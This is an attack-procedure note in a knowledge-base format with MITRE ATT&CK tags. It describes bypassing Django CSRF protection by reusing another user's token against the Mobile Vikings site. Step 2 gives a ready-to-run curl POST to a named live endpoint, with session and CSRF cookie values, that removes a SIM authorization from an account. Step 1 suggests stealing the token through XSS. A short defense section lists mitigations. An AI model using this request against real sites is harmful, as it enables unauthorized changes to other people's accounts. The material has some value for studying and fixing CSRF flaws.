---
tags:
  - csrf
  - web
  - django
  - token-bypass
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-csrf-bypass]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:03.741Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: a42282ef-5b44-41ac-9201-50674adb7167
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Bypass-CSRF-with-Cross-Session-Token

## Summary

This procedure exploits a misconfiguration in Django's CSRF token validation where tokens are not bound to specific sessions, allowing an attacker to use a valid token from any other user session to authorize POST requests, such as removing SIM card authorizations on the Mobile Vikings website.

## Description

The vulnerability arises because the server accepts any valid CSRF token (matching the cookie value) without verifying it against the current session's token. An attacker with access to another user's token (e.g., via XSS or session hijacking) can set it in the request header and cookie to perform state-changing actions. This does not enable fully external CSRF attacks without additional vectors like XSS, but it weakens protections significantly. The target endpoint is /en/sims/authorization/remove/admin/{SIM_ID}/, and exploitation requires a valid session cookie for the target account.

## Requirements

1. Valid session cookie for the target account (e.g., mobilevikingsbe=session_id)
2. A valid CSRF token from any other user session (32-character hex string)
3. Network access to https://mobilevikings.be
4. Knowledge of the target SIM ID (e.g., 1036359)

## Defense

Defensive measures and detection strategies:

- Enforce session-specific CSRF token binding in Django (use django.middleware.csrf.get_token() per session)
- Implement strict same-site cookie policies (Lax or Strict) and monitor for anomalous token usage
- Log and alert on CSRF token mismatches or cross-origin requests
- Use Content Security Policy (CSP) to prevent XSS that could steal tokens

## Objectives

1. Bypass CSRF validation to perform unauthorized POST actions
2. Demonstrate impact on account functions like SIM management
3. Highlight chaining potential with XSS for token injection

## Instructions

### Step 1: Obtain Cross-Session CSRF Token

**Context**: Capture a valid CSRF token from another user's session, for example, by inspecting cookies during login on a secondary account or via an XSS payload that exfiltrates the csrftoken cookie.

**Command** (No specific command; manual inspection or use browser dev tools):

> Expected: A 32-character token like 'LI6qbdczbgPPQ7fxXR3duFENgY1qr3wB'.

### Step 2: Send POST Request with Mismatched Token

**Context**: Use the foreign token in the X-CSRFToken header and csrftoken cookie while maintaining the target's session cookie to trick the server into accepting the request.

**Command** ([[commands/curl-csrf-bypass]]):
```bash
curl -X POST 'https://mobilevikings.be/en/sims/authorization/remove/admin/1036359/' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:35.0) Gecko/20100101 Firefox/35.0' \
  -H 'Accept: */*' \
  -H 'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'X-CSRFToken: LI6qbdczbgPPQ7fxXR3duFENgY1qr3wB' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Referer: https://mobilevikings.be/en/account/authorization/overview/' \
  -H 'Cookie: mobilevikingsbe=fda79999f5d3ea86aee1cac688306948; csrftoken=LI6qbdczbgPPQ7fxXR3duFENgY1qr3wB; cookies.js=1; _ga=GA1.2.843387348.1423586164; utmx=177304377.1C02iW_2TT2rFZKjDPjE7Q$0:0; utmxx=177304377.1C02iW_2TT2rFZKjDPjE7Q$0:1423600511:8035200; __atuvc=5%7C6' \
  -H 'Connection: keep-alive' \
  --data ''
```

> This command sends an empty POST to the removal endpoint. Success is indicated by a 302 redirect and a message cookie set with the removal confirmation. Failure would return a 403 CSRF error if validation were strict.

### Step 3: Verify Impact

**Context**: Check the account overview page to confirm the authorization was removed.

**Command** (Follow-up GET with curl or browser):
```bash
curl -X GET 'https://mobilevikings.be/en/account/authorization/overview/' \
  -H 'Cookie: mobilevikingsbe=fda79999f5d3ea86aee1cac688306948; ...' \
  -H 'Referer: https://mobilevikings.be/en/account/authorization/overview/'
```

> Look for absence of the SIM authorization or success message in the response.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-csrf-bypass]]

## Tools Used


## Tags

- csrf
- web
- django
- token-bypass
